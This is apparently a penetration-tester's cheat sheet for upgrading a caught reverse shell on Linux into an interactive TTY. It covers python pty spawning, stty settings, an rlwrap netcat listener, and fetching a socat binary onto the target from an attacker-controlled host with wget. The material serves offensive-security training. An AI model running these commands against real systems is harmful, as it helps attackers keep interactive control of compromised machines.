# Linux only
## Through python
```bash
# Python is often available. python2/python3 might need to be used
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Get stuff like 'clear' available
export TERM=xterm

# Removes echo (grant autocomplete, array keys, ...)
# Ctrl + Z to put the shell in background then:
stty raw -echo; fg

# Update shell size
stty rows 45
stty cols 116 # 116 = half terminal, 237 full size
```

## Through rlwrap
```bash
# Not fully stabilized shell, but already not so bad:
rlwrap nc -lvnp <port>

# Stabilize:
# Ctrl + Z to put the shell in background then:
stty raw -echo; fg
```

## Through socat
```bash
# Find socat under https://github.com/andrew-d/static-binaries
# Download socat on the target, LOCAL_IP if we download through a vpn directly form the attacker, but we could use the github URI if needed
wget LOCAL_IP/socat -O /tmp/socat
cd /tmp
sudo python3 -m http.server 80
```